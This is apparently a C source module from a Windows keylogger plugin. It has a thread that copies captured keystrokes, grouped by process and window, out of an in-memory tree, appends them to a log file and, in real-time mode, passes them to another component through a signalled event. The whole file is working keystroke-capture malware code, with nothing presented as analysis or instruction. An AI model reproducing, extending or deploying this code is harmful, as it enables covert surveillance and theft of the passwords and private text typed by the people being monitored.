//** Running in the UpadatLogFile Thread.

#include "..\..\..\Include\Keylog.h"

extern	KLIFLINKLIST	*pRoot;
extern	HANDLE			hUpdateLogFileEvent;
extern	WCHAR			LogFilePath[MAX_PATH + 1];

extern	BOOL			fExitKLLogFileUpdate;
extern	BOOL			fRealTime;

extern	PDATA			*pMyPData;

extern	CRITICAL_SECTION	csSleepTimer;
extern	CRITICAL_SECTION	csKLTree;		// init??

DWORD WINAPI UpdateLogFile() {
    DWORD dwRetVal = 0;
    BOOL FuncRetVal = FALSE;

    hUpdateLogFileEvent = CreateEvent(NULL, TRUE, FALSE, L"UpdateLogFile");
    if (hUpdateLogFileEvent == NULL)
        return FALSE;

    while (fExitKLLogFileUpdate != TRUE) {
        dwRetVal = WaitForSingleObject(hUpdateLogFileEvent, 1000);
        if (fExitKLLogFileUpdate != TRUE && dwRetVal == WAIT_OBJECT_0) {
            FuncRetVal = CopyTreeData();
            ResetEvent(hUpdateLogFileEvent);
        }
    }

    return CloseHandle(hUpdateLogFileEvent);
}

BOOL CopyTreeData() {
    KLIFLINKLIST *pCurProcessNode = NULL;
    KLIFLINKLIST *pCurNode = NULL;
    LOGFILEDATA *pTempLogFileData;
    // access violation writing location
    EnterCriticalSection(&csKLTree);

    pCurProcessNode = pRoot;
    while (pCurProcessNode != NULL)	// for each sibling
    {
        pCurNode = pCurProcessNode;
        while (pCurNode != NULL)	// for each nextlink
        {
            if (pCurNode->KeyCount == 0) {
                //if( fRealTime == TRUE )
                //{
                //	;// send a message that ther is no data..
                //}
                pCurNode = pCurNode->pNextLink;
                continue;
            }

            pTempLogFileData = (LOGFILEDATA *)malloc(sizeof(LOGFILEDATA));
            if (pTempLogFileData == NULL) {
                LeaveCriticalSection(&csKLTree);
                return FALSE;
            }

            pTempLogFileData->KeyCount = pCurNode->KeyCount;
            wcscpy_s(pTempLogFileData->Keys, MAX_KLIF_KEYS, pCurNode->Keys);
            pTempLogFileData->KeysBufferLength = pCurNode->KeysBufferLength;
            pTempLogFileData->WndCount = pCurNode->WndCount;
            memcpy(pTempLogFileData->KLWndData, pCurNode->KLWndData, (sizeof(KLWNDDATA) * MAX_WND_LIST));
            memcpy(&pTempLogFileData->ProcessData, &pCurNode->ProcessData, sizeof(KLPROCESSDATA));

            WriteToLogFile(pTempLogFileData);
            if (fRealTime == TRUE)
                SendRealTimeData(pTempLogFileData);

            // reset
            pCurNode->KeyCount = 0;
            wcscpy_s(pCurNode->Keys, MAX_KLIF_KEYS, L"");
            pCurNode->KeysBufferLength = 0;

            pCurNode = pCurNode->pNextLink;
        }

        pCurProcessNode = pCurProcessNode->pSiblingLink;
    }

    LeaveCriticalSection(&csKLTree);

    return TRUE;
}

BOOL WriteToLogFile(LOGFILEDATA *pTempLogFileData) {
    FILE *fpLogFile = NULL;
    int iFileRet = -1;

    iFileRet = _wfopen_s(&fpLogFile, LogFilePath, L"ab");
    if (iFileRet != 0)
        return FALSE;

    fwrite(pTempLogFileData, sizeof(LOGFILEDATA), 1, fpLogFile);

    if (fpLogFile)
        fclose(fpLogFile);

    return TRUE;
}

BOOL SendRealTimeData(LOGFILEDATA *pTempLogFileData) {
    HANDLE hIFDataReadyEvent = NULL;
    int iRetVal = 0;

    // allocate memory for PDATA
    if ((pMyPData = (PDATA*)malloc(sizeof(PDATA))) == NULL)
        return FALSE;
    memset(pMyPData, 0, sizeof(PDATA));

    // construct the PDATA structure and send it
    pMyPData->iMessage = KLM_RT_KEYS;
    pMyPData->PluginID = KEYLOGGER;
    memcpy(&pMyPData->PDataType.KLRTData, pTempLogFileData, sizeof(LOGFILEDATA));

    hIFDataReadyEvent = CreateEvent(NULL, TRUE, FALSE, EVENT_IF_DATA_READY);
    if (hIFDataReadyEvent == NULL) {
        iRetVal = GetLastError();
        return FALSE;
    } else if (GetLastError() == ERROR_ALREADY_EXISTS)
        SetEvent(hIFDataReadyEvent);

    return TRUE;
}
